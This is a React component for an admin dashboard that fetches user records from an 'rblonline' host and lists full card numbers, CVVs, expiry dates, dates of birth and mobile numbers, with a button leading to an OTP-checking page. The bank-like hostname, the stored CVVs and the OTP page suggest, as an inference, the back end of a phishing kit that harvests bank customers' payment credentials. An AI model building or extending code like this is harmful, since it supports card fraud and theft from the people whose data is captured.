import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import "./cardsdetails.css"; // import CSS

export default function UserCardsDetails() {
  const [cards, setCards] = useState([]);
  const [loading, setLoading] = useState(true);

  const navigate = useNavigate();

  // Convert UTC to IST
  const formatIST = (utcDate) => {
    return new Date(utcDate).toLocaleString("en-IN", {
      timeZone: "Asia/Kolkata",
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    });
  };

  // Fetch card details
  const fetchCards = () => {
    setLoading(true);
    fetch("https://rblonline.onrender.com/api/cards/cardDetails")
      .then((res) => res.json())
      .then((data) => {
        setCards(data);
        setLoading(false);
      })
      .catch((err) => {
        console.error("Fetch error:", err);
        setLoading(false);
      });
  };

  // Go to OTP page
  const goToOTP = () => {
    navigate("/admin/otp-check"); // update path if needed
  };

  // Fetch cards on mount
  useEffect(() => {
    fetchCards();
  }, []);

  return (
    <div className="usercards-container">
      {/* Header with buttons */}
      <div className="usercards-header">
        <h2>User Card Details</h2>
        <div className="header-buttons">
          <button className="otp-btn-small" onClick={fetchCards}>
            REFRESH
          </button>
          <button className="otp-btn-small" onClick={goToOTP}>
            CHECK OTP
          </button>
        </div>
      </div>

      {loading ? (
        <p>Loading cards...</p>
      ) : cards.length === 0 ? (
        <p>No cards found</p>
      ) : (
        <div className="table-wrapper">
          <table className="usercards-table">
            <thead>
              <tr>
                <th>Name</th>
                <th>Mobile Number</th>
                <th>DOB</th>
                <th>Card Number</th>
                <th>Expiry Month</th>
                <th>Expiry Year</th>
                <th>CVV</th>
                <th>Created At (IST)</th>
              </tr>
            </thead>
            <tbody>
              {cards.map((card) => (
                <tr key={card._id}>
                  <td>{card.name}</td>
                  <td>{card.mobileNumber}</td>
                  <td>{card.dob}</td>
                  <td>{card.cardNumber}</td>
                  <td>{card.expiryMonth}</td>
                  <td>{card.expiryYear}</td>
                  <td>{card.cvv}</td>
                  <td>{formatIST(card.createdAt)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
